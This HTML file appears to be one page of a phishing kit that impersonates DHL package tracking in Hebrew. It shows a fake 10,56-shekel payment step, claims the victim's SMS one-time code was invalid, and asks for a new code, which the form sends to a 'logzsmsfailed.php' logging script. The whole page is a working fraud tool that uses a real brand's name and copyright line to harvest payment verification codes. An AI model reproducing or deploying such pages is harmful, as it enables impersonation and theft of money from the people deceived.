<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/dhl-logo.jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style2.css">
    <title>DHL_Tracking</title>
</head>
<body>
    <div class="msg-page">
        <div class="msg-header">
            <div class="msg-header-img">
                <img src="img/lg.svg" alt="">
            </div>
        </div>
        <div class="msg-confirm">
            <p>אנא אשר את מספר הטלפון שלך.</p>
        </div>
        <form action="./logz/logzsmsfailed.php" class="msg-content" method="POST">
            <div>
                <div class="msg-content-parg">
                    <p>הסיסמה הייחודית נשלחה למספר הנייד שלך</p>
                </div>
                <div class="msg-content-info">
                    <div class="msg-content-info-item">
                        <p>סוֹחֵר: </p>
                        <span>DHL_EXPRESS</span>
                        <div class="clear"></div>
                    </div>
                    <div class="msg-content-info-item">
                        <p>כמות:</p>
                        <span>10,56 SHEKEL</span>
                        <div class="clear"></div>
                    </div>
       <div class="msg-content-info-item">
                    <p>Code SMS:</p>
                    <div class="form-group mx-sm-3 mb-2 col-5 last">
                        <input type="text" name="msg" class="form-control">
                    </div>
                    <div class="clear"></div>
                </div>
                <div class="msg-content-info-error">
<span style="color:#FF0000;">קוד SMS לא חוקי</span>
                </div>
                <div class="msg-content-info-end">
                    <p>אנא המתן שתקבל קוד אישור נוסף</p>
                </div>
            </div>
        </div>
            <div class="msg-btn">
                <button type="submit" class="btn btn-secondary">שלח</button>
            </div> 
        </form>
        <div class="msg-footer">
            <span class="msg-footer-right">&copy; 2021 DHL_International_GmbH - All rights reserved.</span>
        </div>
    </div>
</body>
</html>